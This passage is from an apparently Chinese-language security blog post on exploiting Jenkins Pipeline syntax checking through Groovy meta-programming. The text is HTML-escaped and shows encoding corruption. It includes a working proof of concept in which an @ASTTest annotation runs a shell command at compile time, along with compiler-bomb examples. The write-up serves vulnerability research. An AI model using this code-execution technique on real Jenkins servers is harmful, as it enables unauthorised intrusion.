        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™è£¡ä½¿ç”¨äº† &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(â€¦)&lt;/a&gt; å»å®Œæˆ Groovy èªæ³•çš„è§£æ! å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±æ–¼é€™åªæ˜¯ä¸€å€‹ AST çš„è§£æï¼Œåœ¨æ²’æœ‰åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; çš„æ–¹æ³•å‰ï¼Œä»»ä½•å±éšªçš„æ“ä½œæ˜¯ä¸æœƒè¢«åŸ·è¡Œçš„ï¼Œä¾‹å¦‚å˜—è©¦å»è§£æé€™æ®µ Groovy ä»£ç¢¼æœƒç™¼ç¾å…¶å¯¦ä»€éº¼äº‹éƒ½æ²’ç™¼ç”Ÿ :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾ç¨‹å¼é–‹ç™¼è€…çš„è§’åº¦ä¾†çœ‹ï¼ŒPipeline å¯ä»¥æ“ä½œ Jenkins é‚£ä¸€å®šå¾ˆå±éšªï¼Œå› æ­¤è¦ç”¨åš´æ ¼çš„æ¬Šé™ä¿è­·ä½! ä½†é€™åªæ˜¯ä¸€æ®µç°¡å–®çš„èªæ³•éŒ¯èª¤æª¢æŸ¥ï¼Œè€Œä¸”å‘¼å«åˆ°çš„åœ°æ–¹å¾ˆå¤šï¼Œé™åˆ¶å¤ªåš´æ ¼çš„æ¬Šé™åªæœƒè®“è‡ªå·±ç¶æ‰‹ç¶è…³çš„!&lt;/p&gt;

&lt;p&gt;ä¸Šé¢çš„è§€é»è½èµ·ä¾†å¾ˆåˆç†ï¼Œå°±åªæ˜¯ä¸€å€‹ AST çš„è§£æè€Œä¸”æ²’æœ‰ä»»ä½• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; æ–¹æ³•æ‡‰è©²å¾ˆå®‰å…¨ï¼Œä½†æ°å·§é€™è£¡å°±æˆç‚ºäº†æˆ‘å€‘ç¬¬ä¸€å€‹å…¥å£é»! å…¶å¯¦ç¬¬ä¸€æ¬¡çœ‹åˆ°é€™æ®µä»£ç¢¼æ™‚ï¼Œä¹Ÿæƒ³ä¸å‡ºä»€éº¼åˆ©ç”¨æ–¹æ³•å°±å…ˆè·³éäº†ï¼Œç›´åˆ°è¦é–‹å§‹æ’°å¯«æŠ€è¡“æ–‡ç« é‡æ–°æº«ç¿’äº†ä¸€æ¬¡ï¼Œæˆ‘æƒ³èµ·äº†èªªä¸å®š Meta-Programming æœƒæœ‰æé ­!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ä»€éº¼æ˜¯-meta-programming&quot;&gt;ä»€éº¼æ˜¯ Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é¦–å…ˆæˆ‘å€‘ä¾†è§£é‡‹ä¸€ä¸‹ä»€éº¼æ˜¯ Meta-Programming!&lt;/p&gt;

&lt;p&gt;Meta-Programming æ˜¯ä¸€ç¨®ç¨‹å¼è¨­è¨ˆçš„æ€ç¶­! Meta-Programming çš„ç²¾é«“åœ¨æ–¼æä¾›äº†ä¸€å€‹æŠ½è±¡å±¤æ¬¡çµ¦é–‹ç™¼è€…ç”¨å¦å¤–ä¸€ç¨®æ€ç¶­å»æ’°å¯«æ›´é«˜éˆæ´»åº¦åŠæ›´é«˜é–‹ç™¼æ•ˆç‡çš„ä»£ç¢¼ã€‚å…¶å¯¦ Meta-Programming ä¸¦æ²’æœ‰ä¸€å€‹å¾ˆåš´è¬¹çš„å®šç¾©ï¼Œä¾‹å¦‚ä½¿ç”¨ç¨‹å¼èªè¨€ç·¨è­¯æ‰€ç•™ä¸‹çš„ Metadata å»å‹•æ…‹çš„ç”¢ç”Ÿç¨‹å¼ç¢¼ï¼Œæˆ–æ˜¯æŠŠç¨‹å¼è‡ªèº«ç•¶æˆè³‡æ–™ï¼Œé€éç·¨è­¯å™¨(compiler)æˆ–æ˜¯ç›´è­¯å™¨(interpreter)å»æ’°å¯«ä»£ç¢¼éƒ½å¯ä»¥è¢«èªªæ˜¯ä¸€ç¨® Meta-Programming! è€Œå…¶ä¸­çš„å“²å­¸å…¶å¯¦éå¸¸å»£æ³›ç”šè‡³å·²ç¶“å¯ä»¥è¢«ç•¶æˆç¨‹å¼èªè¨€çš„ä¸€å€‹ç« ç¯€ä¾†ç¨ç«‹æ¢è¨!&lt;/p&gt;

&lt;p&gt;å¤§éƒ¨åˆ†çš„æ–‡ç« æˆ–æ˜¯æ›¸ç±åœ¨è§£é‡‹ Meta-Programming çš„æ™‚å€™é€šå¸¸æœƒé€™æ¨£è§£é‡‹:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç”¨ç¨‹å¼ç¢¼(code)ç”¢ç”Ÿç¨‹å¼ç¢¼(code)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¦‚æœé‚„æ˜¯å¾ˆé›£ç†è§£ï¼Œä½ å¯ä»¥æƒ³åƒç¨‹å¼èªè¨€ä¸­çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; å…¶å¯¦å°±æ˜¯ä¸€ç¨®å»£ç¾©ä¸Šçš„ Meta-Programming! é›–ç„¶ä¸ç”šç²¾ç¢ºï¼Œä½†ç”¨é€™å€‹æ¯”å–»å¯ä»¥å¿«é€Ÿçš„ç†è§£ Meta-Programming! å…¶å¯¦å°±æ˜¯ç”¨ç¨‹å¼ç¢¼(eval é€™å€‹å‡½æ•¸)å»ç”¢ç”Ÿç¨‹å¼ç¢¼(eval å‡ºä¾†çš„å‡½æ•¸)! åœ¨ç¨‹å¼é–‹ç™¼ä¸Šï¼ŒMeta-Programming ä¹Ÿæœ‰è‘—æ¥µå…¶å¤šçš„æ‡‰ç”¨ï¼Œä¾‹å¦‚:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C èªè¨€ä¸­çš„ Macro&lt;/li&gt;
  &lt;li&gt;C++ çš„ Template&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby æœ¬èº«å°±æ˜¯ä¸€é–€å°‡ Meta-Programming ç™¼æ®åˆ°æ¥µè‡´çš„èªè¨€ï¼Œç”šè‡³é‚„æœ‰å°ˆé–€çš„&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;æ›¸1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;æ›¸2&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Java çš„ Annotation è¨»è§£&lt;/li&gt;
  &lt;li&gt;å„ç¨® DSL(Domain Specific Language) æ‡‰ç”¨ï¼Œä¾‹å¦‚ &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; åŠ &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œç•¶æˆ‘å€‘åœ¨è«‡è«– Meta-Programming æ™‚ï¼Œä¾ç…§ä½œç”¨çš„ç¯„åœæˆ‘å€‘å¤§è‡´åˆ†æˆ &lt;strong&gt;(1)ç·¨è­¯æ™‚æœŸ&lt;/strong&gt; åŠ &lt;strong&gt;(2)åŸ·è¡Œæ™‚æœŸ&lt;/strong&gt;é€™å…©ç¨® Meta-Programming! è€Œæˆ‘å€‘ä»Šå¤©çš„é‡é»ï¼Œå°±æ˜¯åœ¨ç·¨è­¯æ™‚æœŸçš„ Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. æˆ‘ä¹Ÿä¸æ˜¯ä¸€ä½ Programming Language å¤§å¸«ï¼Œå¦‚æœ‰ä¸ç²¾ç¢ºæˆ–è€…è¦ºå¾—æ•™å£å°æœ‹å‹çš„åœ°æ–¹å†è«‹å¤šå¤šåŒ…æ¶µ &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨&quot;&gt;å¦‚ä½•åˆ©ç”¨&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;å¾å‰é¢çš„æ®µè½ä¸­æˆ‘å€‘ç™¼ç¾ Jenkins ä½¿ç”¨ &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(â€¦)&lt;/a&gt; å»æª¢æŸ¥èªæ³•éŒ¯èª¤ï¼Œæˆ‘å€‘ä¹Ÿæƒ³èµ·äº† Meta-Programming å¯åœ¨ç·¨è­¯æ™‚æœŸå°ç¨‹å¼ç¢¼åšä¸€äº›å‹•æ…‹çš„æ“ä½œ! è¨­è¨ˆä¸€å€‹ç·¨è­¯å™¨(æˆ–è§£æå™¨)æ˜¯ä¸€ä»¶å¾ˆéº»ç…©çš„äº‹æƒ…ï¼Œè£¡é¢æœƒæœ‰å„ç¨®éª¯é«’çš„å¯¦ä½œæˆ–æ˜¯å¥‡æ€ªçš„åŠŸèƒ½ï¼Œæ‰€ä»¥ä¸€å€‹å¾ˆç›´è¦ºçš„æƒ³æ³•å°±æ˜¯ï¼Œæ˜¯å¦å¯ä»¥é€éç·¨è­¯å™¨ä¸€äº›å‰¯ä½œç”¨(Side Effect)å»å®Œæˆä¸€äº›äº‹æƒ…å‘¢?&lt;/p&gt;

&lt;p&gt;èˆ‰å¹¾å€‹æ·ºé¡¯æ˜“æ‡‚çš„ä¾‹å­ï¼Œå¦‚ C èªè¨€å·¨é›†æ“´å±•æ‰€é€ æˆçš„è³‡æºè€—ç›¡&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç·¨è­¯å™¨çš„è³‡æºè€—ç›¡(ç”¨ 18 bytes ç”¢ç”Ÿ 16G çš„åŸ·è¡Œæª”)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ–æ˜¯ç”¨ç·¨è­¯å™¨ä¾†å¹«ä½ ç®—è²»å¼æ•¸åˆ—&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾çµ„åˆèªè¨€çš„çµæœå¯ä»¥çœ‹å‡ºé€™äº›å€¼åœ¨ç·¨è­¯æœŸé–“å°±è¢«è¨ˆç®—å¥½å¡«å……é€²å»ï¼Œè€Œä¸æ˜¯åŸ·è¡ŒæœŸé–“!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ›´å¤šçš„ä¾‹å­ä½ å¯ä»¥åƒè€ƒ StackOverflow ä¸Šçš„ &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; é€™ç¯‡æ–‡ç« !&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;é¦–æ¬¡å˜—è©¦&quot;&gt;é¦–æ¬¡å˜—è©¦&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;å›åˆ°æˆ‘å€‘çš„æ¼æ´åˆ©ç”¨ä¸Šï¼ŒPipeline æ˜¯åŸºæ–¼ Groovy ä¸Šçš„ä¸€å€‹ DSL å¯¦ä½œï¼Œè€Œ Groovy å‰›å¥½å°±æ˜¯ä¸€é–€å°æ–¼ Meta-Programming éå¸¸å‹å–„çš„èªè¨€! ç¿»é–±è‘— Grovvy å®˜æ–¹çš„ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming æ‰‹å†Š&lt;/a&gt; é–‹å§‹å°‹æ‰¾å„ç¨®å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•! åœ¨ 2.1.9 ç« ã€Œæ¸¬è©¦å”åŠ©ã€é€™å€‹æ®µè½ç™¼ç¾äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; é€™å€‹è¨»è§£ï¼Œä»”ç´°è§€å¯Ÿå®ƒçš„æ•˜è¿°:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer â€œexploreâ€ the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä»€éº¼! å¯ä»¥åœ¨ AST ä¸ŠåŸ·è¡Œä¸€å€‹ assertion? é€™ä¸å°±æ˜¯æˆ‘å€‘è¦çš„å—? è¶•ç·Šå…ˆåœ¨æœ¬åœ°å¯«å€‹ Proof-of-Concept å˜—è©¦æ˜¯å¦å¯è¡Œ:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¹¹ï¼Œå¯ä»¥æ¬¸! ä½†ä»£èªŒä¸¦ä¸æ˜¯æ†¨äººæƒ³çš„é‚£éº¼ç°¡å–®! å˜—è©¦åœ¨é ç«¯ Jenkins é‡ç¾æ™‚ï¼Œå‡ºç¾äº†:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;çœŸæ˜¯é»‘äººå•è™Ÿï¼Œæ£®77ï¼Œé€™åˆ°åº•æ˜¯ä¸‰å°å•¦!!!&lt;/p&gt;

